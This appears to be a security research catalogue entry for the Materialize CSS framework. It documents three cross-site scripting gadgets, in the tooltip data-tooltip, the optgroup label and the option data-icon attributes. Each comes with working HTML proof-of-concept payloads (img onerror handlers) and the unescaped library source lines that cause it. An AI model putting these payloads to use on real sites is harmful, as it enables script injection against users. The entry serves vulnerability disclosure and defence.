---
description: Materialize, a CSS Framework based on Material Design.
github: Dogfalo/materialize
gadgets:
  Latest (1):
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - class-attr
      - data-attr
      - before-func-call
    pocs:
      - description: A `M.Tooltip.init` call is required on a user controlled node with a `hover` interaction.
        code: |
          <!-- user input -->
          <x class="tooltipped" data-tooltip="<img src=x onerror=alert(document.domain)>">Hover me</x>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
          <script>
              var elems = document.querySelectorAll(".tooltipped");
              var instances = M.Tooltip.init(elems);
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/Dogfalo/materialize/blob/824e78248b3de81e383445e76ffb04cc3264fe7d/js/tooltip.js#L284">https://github.com/Dogfalo/materialize/blob/824e78248b3de81e383445e76ffb04cc3264fe7d/js/tooltip.js#L284</a>

      ```javascript
      _getAttributeOptions() {
        let attributeOptions = {};
        let tooltipTextOption = this.el.getAttribute('data-tooltip');
        let positionOption = this.el.getAttribute('data-position');

        if (tooltipTextOption) {
          attributeOptions.html = tooltipTextOption;
        }

        if (positionOption) {
          attributeOptions.position = positionOption;
        }
        return attributeOptions;
      }
      ```
    links:
  Latest (2):
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - select-tag
      - optgroup-tag
      - label-attr
      - before-func-call
    pocs:
      - description: A `M.FormSelect.init` call is required on a user controlled node.
        code: |
          <!-- user input -->
          <select>
              <optgroup label="<img src=x onerror=alert(document.domain)>"></optgroup>
          </select>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
          <script>
              var elems = document.querySelectorAll("select");
              M.FormSelect.init(elems);
          </script>
      - description: With [jQuery](https://github.com/jquery/jquery) it would looks like this.
        code: |
          <!-- user input -->
          <select>
              <optgroup label="<img src=x onerror=alert(document.domain)>"></optgroup>
          </select>

          <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
          <script>
            $(document).ready(function(){
                $('select').formSelect();
            });
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/Dogfalo/materialize/blob/824e78248b3de81e383445e76ffb04cc3264fe7d/js/select.js#L209">https://github.com/Dogfalo/materialize/blob/824e78248b3de81e383445e76ffb04cc3264fe7d/js/select.js#L209</a>

      ```javascript
      } else if ($(el).is('optgroup')) {
        // Optgroup.
        let selectOptions = $(el).children('option');
        $(this.dropdownOptions).append(
          $('<li class="optgroup"><span>' + el.getAttribute('label') + '</span></li>')[0]
        );

        selectOptions.each((el) => {
          let optionEl = this._appendOptionWithIcon(this.$el, el, 'optgroup-option');
          this._addOptionToValueDict(el, optionEl);
        });
      }
      ```
  Latest (3):
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - select-tag
      - optgroup-tag
      - label-attr
      - before-func-call
    pocs:
      - description: The [Materialize](https://github.com/Dogfalo/materialize) library uses the `data-icon` attribute to load additional images without escaping user input in the `src` attribute. A `M.FormSelect.init` call is required on a user controlled node.
        code: |
          <!-- user input -->
          <select>
              <option data-icon='x"onerror="alert(document.domain)'></option>
          </select>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
          <script>
              var elems = document.querySelectorAll("select");
              M.FormSelect.init(elems);
          </script>
      - description: With [jQuery](https://github.com/jquery/jquery) it would looks like this.
        code: |
          <!-- user input -->
          <select>
              <option data-icon='x"onerror="alert(document.domain)'></option>
          </select>

          <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
          <script>
            $(document).ready(function(){
                $('select').formSelect();
            });
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/Dogfalo/materialize/blob/824e78248b3de81e383445e76ffb04cc3264fe7d/js/select.js#L335">https://github.com/Dogfalo/materialize/blob/824e78248b3de81e383445e76ffb04cc3264fe7d/js/select.js#L335</a>

      ```javascript
      let iconUrl = option.getAttribute('data-icon');
      if (!!iconUrl) {
        let imgEl = $(`<img alt="" src="${iconUrl}">`);
        liEl.prepend(imgEl);
      }
      ```
---
